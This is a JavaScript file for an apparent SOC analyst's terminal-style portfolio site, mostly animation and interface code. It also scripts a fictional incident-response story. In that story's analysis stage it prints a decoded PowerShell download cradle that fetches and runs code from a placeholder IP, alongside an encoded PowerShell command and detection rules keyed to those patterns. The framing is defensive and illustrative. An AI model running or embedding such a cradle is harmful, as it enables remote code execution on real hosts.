/* ============================================================
   0xPrashanthSec — Terminal Session
   - Every section is a command: when it scrolls into view the
     command types itself at the prompt, then its output prints
     line by line.
   - The live operation is scroll-scrubbed: scroll position is the
     keyboard, scrolling back rewinds.
   - Window chrome: active tab, IST clock, progress meter.
   Hosts, case IDs and IPs in the operation are fictional
   (203.0.113.0/24 is a documentation-only range).
   ============================================================ */

'use strict';

(function () {
    const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    const $  = (s, r = document) => r.querySelector(s);
    const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));

    /* ── Session blocks: type the command, then print output ── */
    const TYPE_MS = 13, LINE_MS = 38;
    const timers = new Set();
    let skipAll = false;
    try { skipAll = sessionStorage.getItem('skipTyping') === '1'; } catch (e) { /* ignore */ }

    function showBlock(blk) {
        blk.dataset.ran = '1';
        const cmd = $('.cmd', blk);
        if (cmd) { cmd.textContent = cmd.dataset.cmd; cmd.classList.remove('typing'); }
        $$('.out .ln', blk).forEach(l => l.classList.add('on'));
    }

    function runBlock(blk, done) {
        if (blk.dataset.ran) return;
        if (skipAll) { showBlock(blk); if (done) done(); return; }
        blk.dataset.ran = '1';
        const cmd   = $('.cmd', blk);
        const lines = $$('.out .ln', blk);
        const later = (fn, ms) => { const t = setTimeout(() => { timers.delete(t); fn(); }, ms); timers.add(t); };
        const print = () => {
            lines.forEach((ln, i) => later(() => ln.classList.add('on'), i * LINE_MS));
            if (done) later(done, lines.length * LINE_MS);
        };
        if (!cmd) return print();
        const text = cmd.dataset.cmd;
        let i = 0;
        cmd.classList.add('typing');
        const iv = setInterval(() => {
            cmd.textContent = text.slice(0, ++i);
            if (i >= text.length) {
                clearInterval(iv); timers.delete(iv);
                later(() => { cmd.classList.remove('typing'); print(); }, 90);
            }
        }, TYPE_MS);
        timers.add(iv);
    }

    /* Skip button: reveal the whole session at once (Esc works too) */
    const skipBtn = document.createElement('button');
    skipBtn.type = 'button';
    skipBtn.className = 'skip-anim';
    skipBtn.innerHTML = 'skip <b>▸▸</b>';
    skipBtn.setAttribute('aria-label', 'Skip typing animation and show all content');
    function skipNow() {
        if (skipAll) return;
        skipAll = true;
        try { sessionStorage.setItem('skipTyping', '1'); } catch (e) { /* ignore */ }
        timers.forEach(t => { clearTimeout(t); clearInterval(t); });
        timers.clear();
        $$('.blk').forEach(showBlock);
        startRole();
        skipBtn.hidden = true;
    }
    skipBtn.addEventListener('click', skipNow);
    document.addEventListener('keydown', e => { if (e.key === 'Escape') skipNow(); });

    const blocks = $$('.blk');
    if (reduceMotion || skipAll || !('IntersectionObserver' in window)) {
        blocks.forEach(showBlock);
        setTimeout(startRole, 0);
    } else {
        document.body.appendChild(skipBtn);
        const io = new IntersectionObserver(entries => {
            entries.forEach(e => {
                if (!e.isIntersecting) return;
                io.unobserve(e.target);
                runBlock(e.target);
            });
        }, { rootMargin: '0px 0px -12% 0px', threshold: 0.05 });
        blocks.forEach(b => { if (!b.hasAttribute('data-auto')) io.observe(b); });
        const hero = $('[data-auto]');
        if (hero) setTimeout(() => runBlock(hero, startRole), 250);
    }

    /* ── Rotating role line in the hero ─────────────────────── */
    let roleStarted = false;
    function startRole() {
        const el = $('#role');
        if (!el || roleStarted) return;
        roleStarted = true;
        const roles = [
            'SOC Manager · leading the people behind the alerts',
            'Detection Engineer · 300+ rules in production',
            'Purple Team Operator · CRTE / CRTO',
            'Threat Hunter · DFIR · malware analysis',
            'Builder · Sigma, ES|QL and automation tooling',
        ];
        if (reduceMotion) { el.textContent = roles[0]; return; }
        let ri = 0, ci = 0, del = false, wait = 0;
        setInterval(() => {
            if (wait > 0) { wait--; return; }
            const w = roles[ri];
            if (del) {
                el.textContent = w.slice(0, --ci);
                if (ci === 0) { del = false; ri = (ri + 1) % roles.length; wait = 6; }
            } else {
                el.textContent = w.slice(0, ++ci);
                if (ci === w.length) { del = true; wait = 45; }
            }
        }, 45);
    }

    /* ── Hero: last login + footer year ──────────────────────── */
    const ll = $('#last-login');
    if (ll) ll.textContent = new Date().toLocaleString('en-GB', {
        weekday: 'short', day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit', timeZone: 'Asia/Kolkata',
    }) + ' IST';
    const yr = $('#year');
    if (yr) yr.textContent = new Date().getFullYear();

    /* ── Theme toggle (dark / light), remembered per browser ──── */
    const root   = document.documentElement;
    const toggle = $('#theme-toggle');
    const metaTheme = $('meta[name="theme-color"]');
    function applyTheme(t, animate) {
        if (animate && !reduceMotion) {
            root.classList.add('theme-anim');
            setTimeout(() => root.classList.remove('theme-anim'), 400);
        }
        root.setAttribute('data-theme', t);
        if (toggle) {
            toggle.innerHTML = `<b>--theme</b> ${t}`;
            toggle.setAttribute('aria-label', `Switch to ${t === 'dark' ? 'light' : 'dark'} theme`);
        }
        if (metaTheme) metaTheme.setAttribute('content', t === 'dark' ? '#0d0c0b' : '#f8f7f5');
    }
    applyTheme(root.getAttribute('data-theme') || 'dark', false);
    if (toggle) toggle.addEventListener('click', () => {
        const next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
        try { localStorage.setItem('theme', next); } catch (e) { /* private mode */ }
        applyTheme(next, true);
    });

    /* ── Email: stored as base64, decoded on request ─────────────
       The plain address never appears in the HTML, so scrapers
       looking for name@domain find nothing. Clicking "decode"
       scrambles, then resolves into a clickable mailto link.    */
    const GLYPHS = '!<>-_\\/[]{}=+*^?#01ABCDEFabcdef';
    $$('.b64').forEach(box => {
        const btn = $('.b64-btn', box);
        if (!btn) return;
        btn.addEventListener('click', () => {
            let addr;
            try { addr = atob(box.dataset.b64); } catch (e) { return; }
            const out = document.createElement('a');
            out.className = 'b64-out';
            out.href = 'mailto:' + addr;
            box.replaceChildren(out);
            if (reduceMotion) { out.textContent = addr; return; }
            let frame = 0;
            const total = addr.length + 10;
            const iv = setInterval(() => {
                frame++;
                const settled = Math.max(0, frame - 10);
                out.textContent = addr.split('').map((ch, i) =>
                    i < settled ? ch : GLYPHS[Math.floor(Math.random() * GLYPHS.length)]
                ).join('');
                if (frame >= total) { clearInterval(iv); out.textContent = addr; out.classList.add('done'); }
            }, 28);
        });
    });

    /* ── Detections: copy query to clipboard ────────────────── */
    $$('.det-code .copy').forEach(btn => {
        btn.addEventListener('click', async () => {
            const code = btn.parentElement.querySelector('code');
            try {
                await navigator.clipboard.writeText(code.textContent);
                btn.textContent = 'copied ✓';
            } catch (e) {
                const r = document.createRange(); r.selectNodeContents(code);
                const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(r);
                btn.textContent = 'selected';
            }
            btn.classList.add('done');
            setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('done'); }, 1600);
        });
    });

    /* ── Chrome: IST clock ───────────────────────────────────── */
    const clock = $('#clock');
    function tick() {
        if (clock) clock.textContent = 'IST ' + new Date().toLocaleTimeString('en-GB', { timeZone: 'Asia/Kolkata', hour12: false });
    }
    tick(); setInterval(tick, 1000);

    /* ── Live operation transcript ───────────────────────────── */
    const STAGES = [
        { name: 'TRIAGE', ttp: 'T1059.001', lines: [
            { k: 'cmd', s: 'alerts tail --severity high --last 15m' },
            { k: 'out', s: '[06:42:11] HIGH  Java Child Process with Download or Encoded Command', c: 'crit' },
            { k: 'out', s: '           host=APP-WEB-04  user=svc_tomcat  rule=2c0e1279', c: 'dim' },
            { k: 'cmd', s: "jq '.process | {parent: .parent.name, cmd: .command_line}' alert.json" },
            { k: 'out', s: '{ "parent": "java.exe",' },
            { k: 'out', s: '  "cmd": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A..." }', c: 'warn' },
            { k: 'gap' },
        ] },
        { name: 'HUNTING', ttp: 'T1190', lines: [
            { k: 'cmd', s: 'esql "FROM logs-endpoint.events.process-*' },
            { k: 'cont', s: '| WHERE process.parent.name == \\"java.exe\\"' },
            { k: 'cont', s: '| STATS hosts = COUNT_DISTINCT(host.name) BY process.hash.sha256"' },
            { k: 'out', s: 'process.hash.sha256                         hosts', c: 'dim' },
            { k: 'out', s: '9f2c4b7e…a81de41a                              1', c: 'info' },
            { k: 'out', s: '✔ scope: single host — no lateral spread observed', c: 'ok' },
            { k: 'gap' },
        ] },
        { name: 'ANALYSIS', ttp: 'T1105', lines: [
            { k: 'cmd', s: 'echo "$B64" | base64 -d | iconv -f utf-16le' },
            { k: 'out', s: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')", c: 'warn' },
            { k: 'cmd', s: 'yara -s rules/loaders.yar dropped/stage2.bin' },
            { k: 'out', s: 'PS_Download_Cradle dropped/stage2.bin', c: 'crit' },
            { k: 'out', s: '0x1a4:$cradle: DownloadString', c: 'dim' },
            { k: 'cmd', s: 'iocx extract dropped/ --format csv > iocs.csv' },
            { k: 'out', s: '✔ 1 ip · 1 url · 2 sha256 extracted', c: 'ok' },
            { k: 'gap' },
        ] },
        { name: 'DETECTION', ttp: 'TA0002', lines: [
            { k: 'cmd', s: 'sigma convert -t eql -p ecs_windows rules/java_child_encoded.yml' },
            { k: 'out', s: 'process where process.parent.name : ("java.exe", "javaw.exe")', c: 'info' },
            { k: 'out', s: '  and process.command_line : ("* -enc*", "*DownloadString*")', c: 'info' },
            { k: 'cmd', s: 'python -m detection_rules test' },
            { k: 'out', s: '✔ 1 rule validated · 0 errors · pushed to production', c: 'ok' },
            { k: 'gap' },
        ] },
        { name: 'CONTAINMENT', ttp: 'IR-2047', lines: [
            { k: 'cmd', s: 'edr isolate --host APP-WEB-04 --case IR-2047' },
            { k: 'out', s: '✔ host isolated · network contained', c: 'ok' },
            { k: 'cmd', s: 'ioc push --type ip 203.0.113.7 --ttl 30d' },
            { k: 'out', s: '✔ blocked at perimeter on 3 firewalls', c: 'ok' },
            { k: 'cmd', s: 'case close IR-2047 --summary' },
            { k: 'out', s: 'MTTD 4m12s · MTTR 18m · root cause: vulnerable Java service', c: 'acc' },
        ] },
    ];

    const W_OUT = 5, W_GAP = 2, W_HOLD = 14, FINISH_AT = 0.92;
    const tape = [], stageStart = [];
    let T = 0;
    STAGES.forEach((st, si) => {
        stageStart.push(T);
        st.lines.forEach(l => {
            const w = (l.k === 'cmd' || l.k === 'cont') ? l.s.length : (l.k === 'gap' ? W_GAP : W_OUT);
            tape.push({ stage: si, ...l, start: T, end: T + w });
            T += w;
        });
        T += W_HOLD;
    });
    const TOTAL = T;

    const esc = s => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    function lineHTML(l, upto) {
        if (l.k === 'gap') return '<p>&nbsp;</p>';
        if (l.k === 'out') return `<p class="to ${l.c || ''}">${esc(l.s)}</p>`;
        const prompt = l.k === 'cmd' ? '<span class="tp">❯ </span>' : '<span class="tp op-cont">&gt; </span>';
        const text = upto == null ? l.s : l.s.slice(0, upto);
        return `<p>${prompt}<span class="tc">${esc(text)}</span>${upto != null ? '<span class="op-caret">▌</span>' : ''}</p>`;
    }

    const track  = $('#op-track');
    const body   = $('#op-body');
    const stages = $$('#op-stages .op-stage');
    const ttpEl  = $('#op-ttp'), stateEl = $('#op-state'), pctEl = $('#op-pct'), led = $('#op-led');
    let lastTick = -1;

    function trackProgress() {
        const r = track.getBoundingClientRect();
        const span = r.height - window.innerHeight;
        return span <= 0 ? 1 : Math.min(1, Math.max(0, -r.top / span));
    }

    function renderOp() {
        const tick = Math.floor(Math.min(1, trackProgress() / FINISH_AT) * TOTAL);
        if (tick === lastTick) return;
        lastTick = tick;
        let html = '', typing = false;
        for (const l of tape) {
            if (l.start >= tick) break;
            if (l.end <= tick || l.k === 'out' || l.k === 'gap') html += lineHTML(l, null);
            else { html += lineHTML(l, tick - l.start); typing = true; }
        }
        const complete = tick >= TOTAL;
        if (!typing) html += `<p><span class="tp">❯ </span><span class="${complete ? 'blink-cur' : 'op-caret'}">▌</span></p>`;
        body.innerHTML = html;
        body.scrollTop = body.scrollHeight;

        let si = 0;
        stageStart.forEach((s, i) => { if (tick >= s) si = i; });
        stages.forEach((el, i) => {
            el.classList.toggle('active', i === si && !complete);
            el.classList.toggle('done', i < si || complete);
        });
        ttpEl.textContent = STAGES[si].ttp;
        stateEl.textContent = complete ? 'CASE IR-2047 · CLOSED' : `CASE IR-2047 · ${STAGES[si].name}`;
        led.classList.toggle('ok', complete);
        pctEl.textContent = String(Math.round((tick / TOTAL) * 100)).padStart(2, '0') + '%';
    }

    if (track && body) {
        stages.forEach((el, i) => {
            el.tabIndex = 0;
            el.setAttribute('role', 'button');
            const go = () => {
                const r = track.getBoundingClientRect();
                const span = r.height - window.innerHeight;
                const top = window.scrollY + r.top + ((stageStart[i] + 1) / TOTAL) * FINISH_AT * span;
                window.scrollTo({ top, behavior: reduceMotion ? 'auto' : 'smooth' });
            };
            el.addEventListener('click', go);
            el.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); go(); } });
        });
    }

    /* ── Chrome: progress meter + active tab ────────────────── */
    const chrome = $('#chrome');
    const meter  = $('#meter');
    const tabs   = $$('.tab[href^="#"]');
    const secs   = tabs.map(t => $(t.getAttribute('href'))).filter(Boolean);

    function renderChrome() {
        const max = document.documentElement.scrollHeight - window.innerHeight;
        const p = max > 0 ? Math.min(1, window.scrollY / max) : 0;
        const filled = Math.round(p * 10);
        if (meter) meter.textContent = `[${'#'.repeat(filled)}${'.'.repeat(10 - filled)}] ${String(Math.round(p * 100)).padStart(2, '0')}%`;
        if (chrome) chrome.style.setProperty('--progress', (p * 100).toFixed(1) + '%');

        const y = window.scrollY + window.innerHeight * 0.3;
        let current = null;
        secs.forEach(s => { if (s.offsetTop <= y) current = s; });
        tabs.forEach(t => t.classList.toggle('active', current && t.getAttribute('href') === '#' + current.id));
    }

    let queued = false;
    function onScroll() {
        if (queued) return;
        queued = true;
        requestAnimationFrame(() => {
            queued = false;
            if (track && body) renderOp();
            renderChrome();
        });
    }
    window.addEventListener('scroll', onScroll, { passive: true });
    window.addEventListener('resize', onScroll, { passive: true });
    onScroll();

    console.log('%c┌──(root㉿0xPrashanthSec)-[~]\n└─# echo "hello, fellow defender"', 'font-family:monospace;color:#e0475b');
})();
